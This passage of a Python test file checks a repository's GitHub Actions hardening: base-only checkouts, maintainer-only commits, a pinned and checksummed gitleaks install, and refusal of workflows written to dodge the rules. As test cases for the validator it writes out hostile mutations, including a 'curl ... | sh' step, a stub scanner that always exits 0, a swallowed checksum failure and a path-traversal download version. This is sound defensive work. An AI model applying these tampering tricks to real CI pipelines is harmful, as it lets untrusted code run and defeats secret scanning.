        cases = [(index, "      MUTANTS_SHARD: 0\n", told), (total, "      MUTANTS_SHARDS: 8\n", told),
                 (total, "", told), (index, index + "      OTHER: 1\n", told),
                 ("        shard:\n", "        leg:\n", "not the one key shard"),
                 ("    env:\n      MUTANTS_SHARD", "    container: ghcr.io/x/y:1\n    env:\n      MUTANTS_SHARD", "keys other than"),
                 ("      contents: read\n", "      contents: write\n", "granted other than"),
                 ("      contents: read\n", "      contents: read\n      issues: write\n", "granted other than"),
                 (run, run + "        working-directory: evil\n", shape), (run, run + "        env:\n          MUTANTS_SHARD: 0\n", shape),
                 (run, run + "      - run: make verify\n", shape),
                 (run, "      - run: python3 -m tools.mutants --quick\n", shape),
                 (run, "      - run: |\n          python3 -m tools.mutants\n", shape),
                 ("          fetch-depth: 0\n      - run: python3 -m tools.mutants\n", "      - run: python3 -m tools.mutants\n", shape)]
        for old, new, said in cases:
            text = GOOD.replace(job, job.replace(old, new))
            self.assertNotEqual(text, GOOD, said)
            self.assertTrue(caught(self.lens_problems(text), said), (old, new, said))
        # No job runs the mutants at all, or the job that did runs something else: the gate is gone, not reshaped.
        self.assertIn("form", rules(GOOD.replace(job, job.replace("          fetch-depth: 0\n", "        with:\n          fetch-depth: 0\n"))))
        gone = "has no job that runs the mutants"
        self.assertTrue(caught(self.lens_problems(GOOD.replace(job, "").replace("      - mutants\n", "")), gone))
        self.assertTrue(caught(self.lens_problems(GOOD.replace(job, job.replace(run, "      - run: make verify\n"))), gone))
        self.assertEqual(self.lens_problems(GOOD), [])

    def test_a_lens_job_that_judges_its_needs_runs_from_the_base(self):
        # verify's verdict is the base's tools/needs_passed.py: its one checkout is of the base, on a pull request and in
        # the merge queue, and of nothing else, so a change cannot make its own verdict pass (decision 0023).
        ref = "          ref: %s\n" % check_workflows.BASE
        self.assertIn(ref, GOOD)
        said = "its one checkout is not of the base alone"
        head = "      - uses: actions/checkout@" + "a" * 40 + " # v7.0.1\n        with:\n          persist-credentials: false\n"
        mine = ("    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n"
                "        with:\n          persist-credentials: false\n" + ref)
        self.assertEqual(GOOD.count(mine), 1)
        cases = [GOOD.replace(ref, ""),
                 GOOD.replace(ref, "          ref: ${{ github.event.pull_request.base.sha }}\n"),
                 GOOD.replace(ref, "          ref: ${{ github.event.merge_group.base_sha }}\n"),
                 GOOD.replace(ref, ref.replace(" }}", " || github.sha }}")),
                 GOOD.replace(ref, ref.replace(" }}", " || github.event.pull_request.head.sha }}")),
                 GOOD.replace(ref, "          ref: main\n"),
                 GOOD.replace(ref, ref + "          path: base\n"),
                 GOOD.replace(ref, ref + "          repository: someone/else\n"),
                 GOOD.replace(ref, ref + "          fetch-depth: 0\n"),
                 GOOD.replace("      - run: python3 -m tools.needs_passed\n", head + "      - run: python3 -m tools.needs_passed\n"),
                 GOOD.replace(mine, "    steps:\n" + head.replace("false\n", "false\n          path: head\n")
                              + mine[len("    steps:\n"):]),
                 GOOD.replace(mine, "    steps:\n")]
        for text in cases:
            self.assertNotEqual(text, GOOD)
            self.assertTrue(caught(self.lens_problems(text), said), text)
        self.assertFalse(caught(self.lens_problems(GOOD), said))
        # On any other event there is no base: `ref:` would come out empty, and the checkout would be the head's.
        empty = "where there is no base to check out"
        for event in ("  push:\n", "  workflow_dispatch:\n", "  schedule:\n    - cron: '17 3 * * *'\n"):
            text = GOOD.replace("  merge_group:\n", "  merge_group:\n" + event)
            self.assertNotEqual(text, GOOD)
            self.assertTrue(caught(self.lens_problems(text), empty), event)
        for event in ("push", "workflow_dispatch"):
            text = GOOD.replace("on:\n  pull_request:\n  merge_group:\n", "on: %s\n" % event)
            self.assertNotEqual(text, GOOD)
            self.assertTrue(caught(self.lens_problems(text), "its workflow runs on %s, where there is no base" % event),
                            event)
        self.assertFalse(caught(self.lens_problems(GOOD), empty))

    def test_the_required_check_fails_unless_every_job_it_needs_passed(self):
        # `verify` runs under always(), so it reports whatever the jobs it needs did, and only every one's success
        # passes it. Needs it cannot read, or that name no job, fail it too.
        passed = {"checks": {"result": "success", "outputs": {}}, "mutants": {"result": "success", "outputs": {}}}
        self.assertEqual(needs_passed.problems(json.dumps(passed)), [])
        for result in ("failure", "cancelled", "skipped", "Success", None, True):
            said = needs_passed.problems(json.dumps(dict(passed, mutants={"result": result, "outputs": {}})))
            self.assertTrue(caught(said, "the job mutants ended"), result)
        self.assertTrue(caught(needs_passed.problems(json.dumps({"checks": "success"})), "the job checks ended"))
        for text in (None, "", "{", "null", "[]", '"success"'):
            self.assertTrue(caught(needs_passed.problems(text), "cannot be read") or
                            caught(needs_passed.problems(text), "names no job"), text)
        self.assertTrue(caught(needs_passed.problems("{}"), "names no job"))
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(needs_passed.main({"NEEDS": json.dumps(passed)}), 0)
            self.assertEqual(needs_passed.main({"NEEDS": "{}"}), 1)
            self.assertEqual(needs_passed.main({}), 1)

    def test_every_commit_a_pull_request_carries_is_the_maintainers(self):
        # Issue 204: the required check reads each commit between the base and the head, fetched from origin, and
        # refuses unless its author and committer are the identity config/hooks.json names. On a merge group the head,
        # which the queue made, is read for its author alone. An empty range, a head it cannot fetch, or an identity
        # it cannot read refuses. No identity is written in the code: the fixture's Maintainer is not the repo's.
        ada, bob, github = ("Ada", "ada@example.com"), ("Bob", "bob@example.com"), ("GitHub", "noreply@github.com")
        origin, local = tree({"config/hooks.json": json.dumps({"maintainer": {"name": ada[0], "email": ada[1]}})}), None

        def run(where, *args, who=ada):
            env = dict(os.environ, GIT_AUTHOR_NAME=who[0], GIT_AUTHOR_EMAIL=who[1], GIT_COMMITTER_NAME=who[0],
                       GIT_COMMITTER_EMAIL=who[1], GIT_CONFIG_GLOBAL="/dev/null", GIT_CONFIG_NOSYSTEM="1")
            return subprocess.run(["git", *args], cwd=str(where), env=env, capture_output=True, text=True,
                                  timeout=60, check=True).stdout.strip()

        def commit(where, message, author=ada, committer=None):
            env = dict(os.environ, GIT_AUTHOR_NAME=author[0], GIT_AUTHOR_EMAIL=author[1],
                       GIT_COMMITTER_NAME=(committer or author)[0], GIT_COMMITTER_EMAIL=(committer or author)[1],
                       GIT_CONFIG_GLOBAL="/dev/null", GIT_CONFIG_NOSYSTEM="1")
            subprocess.run(["git", "commit", "-q", "--allow-empty", "-m", message], cwd=str(where), env=env,
                           capture_output=True, text=True, timeout=60, check=True)
            return run(where, "rev-parse", "HEAD")

        run(origin, "init", "-q", "-b", "main")
        run(origin, "config", "uploadpack.allowReachableSHA1InWant", "true")
        run(origin, "add", "-A")
        base = commit(origin, "base")
        local = origin.parent / "local"
        run(origin.parent, "clone", "-q", str(origin), str(local))

        def said(head, event="pull_request", root=None):
            return commits_are_the_maintainers.problems(root or local, {"BASE_SHA": base, "HEAD_SHA": head,
                                                                       "EVENT": event})
        # Commits the Maintainer made pass; the head is fetched from origin, which the clone does not yet hold.
        first = commit(origin, "one")
        second = commit(origin, "two")
        self.assertEqual(said(second), [])
        # Another author, or another committer, refuses, and the commit is named.
        other = commit(origin, "three", author=bob, committer=ada)
        self.assertTrue(caught(said(other), "%s is authored by Bob <bob@example.com>" % other[:7]))
        self.assertFalse(caught(said(other), "committed by"))
        run(origin, "reset", "-q", "--hard", second)
        other = commit(origin, "three", committer=bob)
        self.assertTrue(caught(said(other), "%s is committed by Bob" % other[:7]))
        run(origin, "reset", "-q", "--hard", second)
        # On a merge group the head is the queue's: GitHub commits it, its author must still be the Maintainer; a
        # commit before it that GitHub committed is not the queue's, and refuses.
        squash = commit(origin, "squash", committer=github)
        self.assertEqual(said(squash, "merge_group"), [])
        self.assertTrue(caught(said(squash), "committed by GitHub"), "on a pull request the head is its own")
        run(origin, "reset", "-q", "--hard", second)
        wrong = commit(origin, "squash", author=bob, committer=github)
        self.assertTrue(caught(said(wrong, "merge_group"), "authored by Bob"))
        run(origin, "reset", "-q", "--hard", second)
        faked = commit(origin, "faked", committer=github)
        after = commit(origin, "after", committer=github)
        self.assertTrue(caught(said(after, "merge_group"), "%s is committed by GitHub" % faked[:7]))
        self.assertFalse(caught(said(after, "merge_group"), "%s is committed" % after[:7]))
        run(origin, "reset", "-q", "--hard", second)
        # A commit a merge carries is read too, not only the first parent's line.
        run(origin, "checkout", "-q", "-b", "side", second)
        side = commit(origin, "side", author=bob, committer=ada)
        run(origin, "checkout", "-q", "main")
        run(origin, "merge", "-q", "--no-ff", "-m", "merge side", "side")
        merged = run(origin, "rev-parse", "HEAD")
        self.assertTrue(caught(said(merged), "%s is authored by Bob" % side[:7]))
        run(origin, "reset", "-q", "--hard", second)
        run(origin, "branch", "-q", "-D", "side")
        # The name and the email are each the Maintainer's: either alone refuses.
        for who in (("Bob", ada[1]), (ada[0], "bob@example.com")):
            half = commit(origin, "half", author=who, committer=ada)
            self.assertTrue(caught(said(half), "%s is authored by" % half[:7]), who)
            run(origin, "reset", "-q", "--hard", second)
            half = commit(origin, "half", author=ada, committer=who)
            self.assertTrue(caught(said(half), "%s is committed by" % half[:7]), who)
            run(origin, "reset", "-q", "--hard", second)
        # Only the pull request's commits are read, not the base's own since the branch point: the base is the base
        # branch's tip, which the queue moved on with a commit GitHub made.
        run(origin, "checkout", "-q", "-b", "feature", second)
        mine = commit(origin, "mine")
        run(origin, "checkout", "-q", "main")
        moved = commit(origin, "another pull request, squashed", committer=github)
        run(local, "fetch", "-q", "origin", "main")      # the job checks the base out, so the clone holds it
        self.assertEqual(commits_are_the_maintainers.problems(local, {"BASE_SHA": moved, "HEAD_SHA": mine,
                                                                      "EVENT": "pull_request"}), [])
        run(origin, "reset", "-q", "--hard", second)
        run(origin, "branch", "-q", "-D", "feature")
        # An empty range, a head origin does not hold, or an event the check does not know, refuses.
        self.assertTrue(caught(said(base), "no commit lies between"))
        self.assertTrue(caught(said("0" * 40), "cannot be read"))
        for environ in ({}, {"BASE_SHA": base, "HEAD_SHA": second}, {"BASE_SHA": base, "HEAD_SHA": second, "EVENT": "push"}):
            self.assertTrue(caught(commits_are_the_maintainers.problems(local, environ), "must be set"), environ)
        # The identity is the configuration's, not the code's: told another Maintainer, every commit refuses.
        (local / "config" / "hooks.json").write_text(json.dumps({"maintainer": {"name": bob[0], "email": bob[1]}}))
        self.assertEqual(len(said(second)), 4, "two commits, each authored and committed by someone else")
        (local / "config" / "hooks.json").write_text("{}")
        self.assertTrue(caught(said(second), "cannot be read"))
        (local / "config" / "hooks.json").write_text(json.dumps({"maintainer": {"name": ada[0], "email": ada[1]}}))
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(commits_are_the_maintainers.main({"BASE_SHA": base, "HEAD_SHA": second,
                                                               "EVENT": "pull_request"}, local), 0)
            self.assertEqual(commits_are_the_maintainers.main({"BASE_SHA": base, "HEAD_SHA": base,
                                                               "EVENT": "pull_request"}, local), 1)

    def test_a_lens_run_by_actions_names_its_workflow_and_no_other_does(self):
        # GitHub Actions reports every job in the repo, so a Lens it runs must name its file; no other App runs one.
        defaults = json.loads((ROOT / "config" / "defaults.json").read_text())
        for lens in defaults["required_lenses"]["deterministic"]:
            if lens["app_id"] == check_workflows.ACTIONS_APP:
                changed, said = dict(lens, workflow=None), "is run by GitHub Actions and names no workflow file"
            else:
                changed, said = dict(lens, workflow=".github/workflows/verify.yml"), "only GitHub Actions runs one"
            lenses = [changed if x is lens else x for x in defaults["required_lenses"]["deterministic"]]
            cfg = dict(defaults, required_lenses=dict(defaults["required_lenses"], deterministic=lenses))
            root = clone({"config/defaults.json": json.dumps(cfg, indent=2) + "\n"})
            self.assertTrue(caught(check_workflows.run(root), said), lens["lens"])

    def test_an_unreadable_lens_table_is_a_problem_and_the_check_goes_on(self):
        # A check collects every problem: a broken config/defaults.json is reported, and the workflows are still read.
        bad = (ROOT / "examples" / "workflows" / "invalid" / "pin.a-tag-can-move.yml").read_text()
        for text, said in (("{", "cannot be read"), ("{}", "cannot be read"),
                           ('{"required_lenses": {"deterministic": [1]}}', "is not a list of Lenses"),
                           ('{"required_lenses": {"deterministic": [{"lens": "verify", "app_id": 15368, '
                            '"workflow": ".github/workflows/verify.yml"}]}}', "names no check")):
            problems = check_workflows.run(tree({"config/defaults.json": text, ".github/workflows/verify.yml": GOOD,
                                                 ".github/workflows/x.yml": bad, "examples/workflows/verify.yml": GOOD}))
            self.assertTrue(caught(problems, said), text)
            self.assertTrue(caught(problems, ".github/workflows/x.yml: [pin]"), text)

    def test_a_live_workflow_is_held_to_the_rules(self):
        bad = (ROOT / "examples" / "workflows" / "invalid" / "pin.a-tag-can-move.yml").read_text()
        problems = check_workflows.run(tree({".github/workflows/x.yml": bad, "examples/workflows/verify.yml": GOOD}))
        self.assertTrue(caught(problems, ".github/workflows/x.yml: [pin]"))
        self.assertTrue(caught(problems, "holds workflows and not verify.yml"))
        self.assertTrue(caught(check_workflows.run(tree({".github/actions/setup/action.yml": "x"})), "a local action"))

    def test_the_secret_scan_has_rules(self):
        # gitleaks adds its default rules to a config file only when told to; without them it finds nothing.
        config = (ROOT / ".gitleaks.toml").read_text()
        self.assertRegex(config, r"(?m)^\[extend\]\s*\nuseDefault = true$", "the secret scan would run with no rules")
        self.assertNotRegex(config, r"(?m)^\s*disabledRules\s*=", "a default rule is switched off")
        # What is ignored is ignored one finding at a time, by its exact fingerprint: a commit, a file, a rule, a line.
        for line in (ROOT / ".gitleaksignore").read_text().splitlines():
            if line and not line.startswith("#"):
                self.assertRegex(line, r"^[0-9a-f]{40}:[^:]+:[a-z0-9-]+:[0-9]+$", line)

    def test_an_exempt_workflow_is_held_word_for_word(self):
        scan = (ROOT / ".github" / "workflows" / "ci.yml").read_text()
        base = {"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": GOOD}
        as_written = check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": scan})))
        self.assertFalse(caught(as_written, "ci.yml"))
        changed = scan.replace("gitleaks detect", "curl https://example.invalid | sh; gitleaks detect")
        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": changed}))),
                               "ci.yml is exempt from a rule, so it is held word for word"))
        # The exemption is from one rule. Under another name the same text is refused.
        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/scan.yml": scan}))),
                               "scan.yml: [install]"))
        other = scan.replace("ubuntu-24.04", "ubuntu-latest")
        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": other}))),
                               "ci.yml: [runner]"))

    def test_the_tick_probe_is_exempt_from_install_alone(self):
        # Trial P-8 (issue 25): GitHub refuses a step that runs nothing, so the probe's one step is `exit 0`.
        probe = (ROOT / ".github" / "workflows" / "tick-probe.yml").read_text()
        self.assertEqual(check_workflows.EXEMPT["tick-probe.yml"][0], ("install",))
        base = {"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": GOOD}
        self.assertFalse(caught(check_workflows.run(tree(dict(base, **{".github/workflows/tick-probe.yml": probe}))),
                                "tick-probe.yml"))
        more = probe.replace("      - run: exit 0\n", "      - run: exit 0\n      - run: curl https://example.invalid\n")
        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/tick-probe.yml": more}))),
                               "tick-probe.yml is exempt from a rule, so it is held word for word"))
        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/probe.yml": probe}))),
                               "probe.yml: [install]"))
        granted = probe.replace("permissions: {}", "permissions: write-all")
        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/tick-probe.yml": granted}))),
                               "tick-probe.yml: [permissions]"))

    def test_the_secret_scan_reads_the_bases_configuration(self):
        # gitleaks 8.30.1 reads the .gitleaksignore it is told of, and also the one at the top of what it scans, so the
        # scan deletes the head's and reads its rules from a checkout of the base: a change cannot widen the allowlist it
        # needs (decision 0023). The history it scans is still the head's.
        scan = (ROOT / ".github" / "workflows" / "ci.yml").read_text()
        self.assertEqual(check_workflows.scan_problems(scan), [])
        line = "          " + check_workflows.SCAN_RUN[1] + "\n"
        rm = "          " + check_workflows.SCAN_RUN[0] + "\n"
        ref = "          ref: %s\n" % check_workflows.SCAN_BASE
        start = scan.index("      - name: Checkout the base")
        step = scan[start:scan.index("      - name: Install gitleaks")]
        head = scan[scan.index("      - name: Checkout (full history)"):start]
        install = scan[scan.index("      - name: Install gitleaks"):scan.index("      - name: Run gitleaks")]
        self.assertIn(rm + line, scan)
        self.assertIn(ref, step)
        ran, checkout = "does not run, as its last step's whole literal block", "does not check out the head and then the base"
        shape = "does not run, in this order and nothing else"
        installed = "does not install gitleaks by INSTALL_RUN, word for word"
        cases = [(scan.replace("--config base/.gitleaks.toml", "--config .gitleaks.toml"), ran),
                 (scan.replace("--gitleaks-ignore-path base/.gitleaksignore", "--gitleaks-ignore-path ."), ran),
                 (scan.replace(" --gitleaks-ignore-path base/.gitleaksignore", ""), ran),
                 (scan.replace(rm, ""), ran),
                 (scan.replace(rm + line, line + rm), ran),
                 (scan.replace(rm + line, "          gitleaks dir .\n"), ran),
                 # A head's .gitattributes marks a file -diff, and git log -p shows it as binary: --text reads it.
                 (scan.replace(" --text\"", "\""), ran),
                 (scan.replace(" --log-opts=\"--full-history --all --diff-filter=tuxdb --text\"", ""), ran),
                 (scan.replace("--full-history --all ", ""), ran),
                 # An inline gitleaks:allow is the head's own content, and passes over nothing.
                 (scan.replace(" --ignore-gitleaks-allow", ""), ran),
                 (scan.replace(rm + line, "          make verify\n"), ran),
                 # The scan's whole block is SCAN_RUN: a line before the rm, or after the scan, is refused.
                 (scan.replace(rm, "          cp .gitleaks.toml base/.gitleaks.toml\n" + rm), ran),
                 (scan.replace(line, line + "          true\n"), ran),
                 (scan.replace("        run: |\n" + rm + line, "        run: gitleaks detect --source .\n"), ran),
                 # An install on one line is read: it is held whole too.
                 (scan.replace(install, "      - name: Install gitleaks\n        run: cp .gitleaks.toml base/\n"),
                  installed),
                 # The steps are the head's checkout, the base's, the install and the scan, in that order alone.
                 (scan.replace(step, "").replace(rm + line, rm + line + step),
                  shape),
                 (scan.replace(step, step + "      - run: cp .gitleaks.toml base/.gitleaks.toml\n"), shape),
                 (scan.replace("          sudo mv /tmp/gitleaks /usr/local/bin\n",
                               "          sudo mv /tmp/gitleaks /usr/local/bin\n          cp .gitleaks.toml base/\n"),
                  installed),
                 (scan.replace("    permissions:\n      contents: read\n",
                               "    permissions:\n      contents: read\n    env:\n      GIT_DIR: base/.git\n"), shape),
                 (scan.replace("permissions: {}\n", "permissions: {}\ndefaults:\n  run:\n    working-directory: base\n"),
                  shape),
                 (scan.replace("      - name: Run gitleaks\n", "      - name: Run gitleaks\n        working-directory: base\n"),
                  shape),
                 (scan.replace("          GITLEAKS_VERSION:", "          GIT_DIR: base/.git\n          GITLEAKS_VERSION:"),
                  shape),
                 (scan.replace(ref, ref.replace(" || github.sha", "")), checkout),
                 (scan.replace(ref, ref.replace(" || github.event.merge_group.base_sha", "")), checkout),
                 (scan.replace(ref, ref.replace("github.event.pull_request.base.sha || ", "")), checkout),
                 (scan.replace(ref, ref.replace("pull_request.base.sha", "pull_request.head.sha")), checkout),
                 (scan.replace("          path: base\n", ""), checkout),
                 (scan.replace("          path: base\n", "          path: base\n          repository: someone/else\n"),
                  checkout),
                 (scan.replace(step, ""), checkout),
                 (scan.replace(head + step, step + head), checkout),
                 (scan.replace(step, step + step.replace("path: base", "path: other")), checkout)]
        for text, said in cases:
            self.assertNotEqual(text, scan, said)
            self.assertTrue(caught(check_workflows.scan_problems(text), said), (said, text))
        # The check reads it where it stands, and only there.
        base = {"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": GOOD}
        widened = scan.replace("--config base/.gitleaks.toml", "--config .gitleaks.toml")
        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": widened}))),
                               ".github/workflows/ci.yml: ci.yml " + ran))
        self.assertFalse(caught(check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": scan}))), "ci.yml"))

    def test_the_secret_scans_install_is_held_whole(self):
        # The install's whole block is INSTALL_RUN: a stub gitleaks that exits 0 would pass every scan. Only the version
        # and the checksum it reads from its env are free, each held to its shape and quoted: the version goes into the
        # URL's path, where curl folds `/../`.
        scan = (ROOT / ".github" / "workflows" / "ci.yml").read_text()
        self.assertEqual(check_workflows.scan_problems(scan), [])
        block = "".join("          %s\n" % line for line in check_workflows.INSTALL_RUN)
        self.assertIn("        run: |\n" + block + "      - name: Run gitleaks\n", scan)
        version = '          GITLEAKS_VERSION: "8.30.1"\n'
        checksum = '          GITLEAKS_CHECKSUM: "551f6fc83ea457d62a0d98237cbad105af8d557003051f41f3e7ca7b3f2470eb"\n'
        self.assertIn(version + checksum, scan)
        installed = "does not install gitleaks by INSTALL_RUN, word for word"
        stub = "          printf 'exit 0' | sudo tee /usr/local/bin/gitleaks\n          sudo chmod +x /usr/local/bin/gitleaks\n"
        cases = [(scan.replace(block, stub), installed),
                 (scan.replace(block, block + "          true\n"), installed),
                 (scan.replace(block, "          true\n" + block), installed),
                 (scan.replace("sha256sum -c", "sha256sum -c || true"), installed),
                 (scan.replace(" --proto '=https'", ""), installed),
                 (scan.replace("v${GITLEAKS_VERSION}", "v8.30.1"), installed),
                 (scan.replace("https://github.com/gitleaks/gitleaks/", "https://github.com/someone/gitleaks/"), installed),
                 (scan.replace(version, version.replace("8.30.1", "8.30.1/../../../someone/gitleaks/releases/download/v1")),
                  "GITLEAKS_VERSION once"),
                 (scan.replace(version, version.replace('"8.30.1"', "8.30.1")), "GITLEAKS_VERSION once"),
                 (scan.replace(version, version.replace("8.30.1", "8.30")), "GITLEAKS_VERSION once"),
                 (scan.replace(version, version.replace("8.30.1", "8.3O.1")), "GITLEAKS_VERSION once"),
                 (scan.replace(version, version + version), "GITLEAKS_VERSION once"),
                 (scan.replace(version, ""), "GITLEAKS_VERSION once"),
                 (scan.replace(checksum, checksum.replace("551f6fc8", "551F6FC8")), "GITLEAKS_CHECKSUM once"),
                 (scan.replace(checksum, checksum.replace("551f6fc8", "551f6fz8")), "GITLEAKS_CHECKSUM once"),
                 (scan.replace(checksum, checksum.replace("eb\"", "\"")), "GITLEAKS_CHECKSUM once"),
                 (scan.replace(checksum, checksum.replace('"', "")), "GITLEAKS_CHECKSUM once"),
                 (scan.replace(checksum, ""), "GITLEAKS_CHECKSUM once")]
        for text, said in cases:
            self.assertNotEqual(text, scan, said)
            self.assertTrue(caught(check_workflows.scan_problems(text), said), (said, text))
        # read() leaves a line with a tab or a carriage return out of a block, and bash runs it: a file with one holds
        # neither block. A folded block, `>`, is one command, not the lines it is written in.
        tabbed = "          \tprintf 'exit 0' | sudo tee /usr/local/bin/gitleaks\n"
        last = "          sudo mv /tmp/gitleaks /usr/local/bin\n"
        scanned = "          " + check_workflows.SCAN_RUN[1] + "\n"
        ran = "does not run, as its last step's whole literal block"
        for text, said in ((scan.replace(last, last + tabbed), installed),
                           (scan.replace(last, last + tabbed), ran),
                           (scan.replace(scanned, scanned + tabbed), ran),
                           (scan.replace(scanned, scanned + tabbed), installed),
                           (scan.replace(last, last.replace("\n", "\r\n")), installed),
                           (scan.replace("        run: |\n" + block, "        run: >\n" + block), installed),
                           (scan.replace("        run: |\n          rm -f", "        run: >\n          rm -f"), ran),
                           (scan.replace("        run: |\n          rm -f", "        run: |-\n          rm -f"), ran)):
            self.assertNotEqual(text, scan, said)
            self.assertTrue(caught(check_workflows.scan_problems(text), said), (said, text))
        # The same, read from the file as run() reads it: a carriage return must reach read() untranslated.
        root = clone({".github/workflows/ci.yml": scan.replace(last, last.replace("\n", "\r\n"))})
        self.assertTrue(caught(check_workflows.run(root), installed), "a carriage return in ci.yml")
        crlf = clone({".github/workflows/verify.yml": GOOD.replace("\n", "\r\n")})
        self.assertTrue(caught(check_workflows.run(crlf), "verify.yml: [form]"), "windows line ends in a workflow")
        # Another version and checksum of their shapes are free: that is a bump, the reviewer's to judge.
        bumped = scan.replace(version, version.replace("8.30.1", "8.31.0")).replace(checksum, checksum.replace(
            "551f6fc8", "0123abcd"))
        self.assertNotEqual(bumped, scan)
        self.assertEqual(check_workflows.scan_problems(bumped), [])

    def test_every_checkout_is_the_listed_one(self):
        # PIN makes any two pins equal where a text is compared word for word, so neither the EXEMPT hash nor verify.yml's
        # example holds which actions/checkout a workflow runs; CHECKOUT does, in every workflow.
        listed = "%s %s" % check_workflows.CHECKOUT
        old = "actions/checkout@ee0669bd1cc54295c223e0bb666b733df41de1c5 # v2.7.0"
        scan = (ROOT / ".github" / "workflows" / "ci.yml").read_text()
        verify = (ROOT / ".github" / "workflows" / "verify.yml").read_text()
        ref = "          ref: %s\n" % check_workflows.BASE
        base_checkout = "      - uses: %s\n        with:\n          persist-credentials: false\n%s" % (listed, ref)
        self.assertEqual(verify.count(base_checkout), 1)
        self.assertEqual(scan.count(listed), 2)
        self.assertNotIn("pin", rules(scan))
        self.assertEqual(rules(verify), [])
        for text in (scan.replace(listed, old, 1), scan.replace(listed, old),
                     verify.replace(base_checkout, base_checkout.replace(listed, old)),
                     verify.replace(listed, "actions/checkout@" + "a" * 40 + " # v7.0.1"),
                     verify.replace(listed, listed.replace("v7.0.1", "v2.7.0")),
                     verify.replace(listed, listed.replace("actions/checkout", "Actions/Checkout"))):
            self.assertIn("pin", rules(text), text)
        # The hash of the exempt scan does not see it; the pin rule does.
        base = {"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": GOOD}
        problems = check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": scan.replace(listed, old)})))
        self.assertFalse(caught(problems, "held word for word"))
        self.assertTrue(caught(problems, ".github/workflows/ci.yml: [pin] %s is not the listed checkout" % old))
        # Another action keeps any pin that was looked up.
        other = GOOD.replace(STEP, "      - uses: actions/setup-java@" + "a" * 40 + " # v6.0.1\n" + STEP)
        self.assertEqual(rules(other), [])

    def test_a_rule_is_not_dodged_by_writing_the_workflow_another_way(self):
        ways = {
            "a mapping on one line": (GOOD.replace(STEP, "      - {uses: evil/action@main, continue-on-error: true}\n"), "form"),
            "two spaces after the dash": (GOOD.replace(STEP, "      -  uses: actions/checkout@v7\n"), "form"),
            "a quoted key": (GOOD.replace("    runs-on:", '    "runs-on":'), "form"),
            "a colon set apart": (GOOD.replace(STEP, "      - uses : evil/action@main\n"), "form"),
            "an escaped event name": (GOOD.replace("  merge_group:\n", '  merge_group:\n  "pull_request\\x5ftarget":\n'), "form"),
            "a list on one line": (GOOD.replace("  merge_group:\n", "  merge_group:\n  schedule: [{cron: '0 * * * *'}]\n"), "form"),
            "an anchor": (GOOD.replace(STEP, "      - run: &cmd make verify\n      - run: *cmd\n"), "form"),
            "another installer": (GOOD.replace(STEP, "      - run: pipx install ruff\n"), "install"),
            "a download in python": (GOOD.replace(STEP, '      - run: python3 -c "import urllib.request"\n'), "install"),
            "a failure swallowed in shell": (GOOD.replace(STEP, "      - run: make verify || true\n"), "install"),
            "read-all": (GOOD.replace("permissions: {}", "permissions: read-all"), "permissions"),
            "write-all on a job": (GOOD.replace("      contents: read\n", "      write-all\n"), "form"),
            "woken by another workflow": (GOOD.replace("  merge_group:\n", "  merge_group:\n  workflow_run:\n"), "target"),
            "every thirty minutes": (GOOD.replace("  merge_group:\n", '  merge_group:\n  schedule:\n    - cron: "0,30 * * * *"\n'), "cron"),
            "a runner from a matrix": (GOOD.replace("ubuntu-24.04", "${{ matrix.os }}"), "runner"),
            "a runner in a list": (GOOD.replace("    runs-on: ubuntu-24.04\n", "    runs-on:\n      - ubuntu-latest\n"), "runner"),
            "a token in lower case": (GOOD.replace(STEP, STEP + "        env:\n          T: ${{ secrets.gh_pat }}\n"), "token"),
            "inherit in quotes": (GOOD.replace("  verify:\n", '  c:\n    uses: ./.github/workflows/o.yml\n    secrets: "inherit"\n  verify:\n'), "token"),
            "a branch filter": (GOOD.replace("  pull_request:\n", "  pull_request:\n    branches:\n      - release\n"), "queue"),
            "an expression in a script": (GOOD.replace(STEP, "      - uses: actions/github-script@" + "a" * 40 + " # v7\n        with:\n          script: ${{ github.event.comment.body }}\n"), "expression"),
            "a checkout in quotes": (GOOD.replace("actions/checkout@", '"actions/checkout@').replace(" # v7.0.1\n        with:\n          persist-credentials: false", '" # v7.0.1'), "credentials"),
            "a limit named in a comment": (GOOD.replace("    timeout-minutes: 15\n", "").replace("ubuntu-24.04\n", "ubuntu-24.04 # timeout-minutes: later\n"), "timeout"),
            "windows line ends": (GOOD.replace("\n", "\r\n"), "form"),
            "a key written twice": (GOOD.replace("    timeout-minutes: 15\n", "    timeout-minutes: 15\n    timeout-minutes: 600\n"), "form"),
            "a step's key written twice": (GOOD.replace(STEP, "      - run: make verify\n        run: make evil\n"), "form"),
            "nothing at all": ("", "form"),
        }
        for name, (text, rule) in ways.items():
            self.assertIn(rule, rules(text), name)

    def test_a_workflow_that_keeps_the_rules_is_not_refused(self):
        fine = {
            "continue-on-error: false": GOOD.replace(STEP, STEP + "        continue-on-error: false\n"),
            "a comment naming a banned event": GOOD.replace("  pull_request:\n", "  pull_request:    # never pull_request_target\n"),
            "a secret whose name holds the letters": GOOD.replace(STEP, STEP + "        env:\n          K: ${{ secrets.RELAY_DISPATCH_KEY }}\n"),
            "the org's reusable at its channel": GOOD.replace("  verify:\n", "  shield:\n    uses: combsmith/.github/.github/workflows/agent-shield-reusable.yml@agent-shield/v2-stable\n  verify:\n"),
            "an off-zero schedule": GOOD.replace("  merge_group:\n", "  merge_group:\n  schedule:\n    - cron: '17,47 * * * *'\n"),
            "indented by four": "\n".join((len(l) - len(l.lstrip(" "))) * " " + l for l in GOOD.split("\n")),
        }
        for name, text in fine.items():
            self.assertEqual(rules(text), [], name)


class TheList(unittest.TestCase):
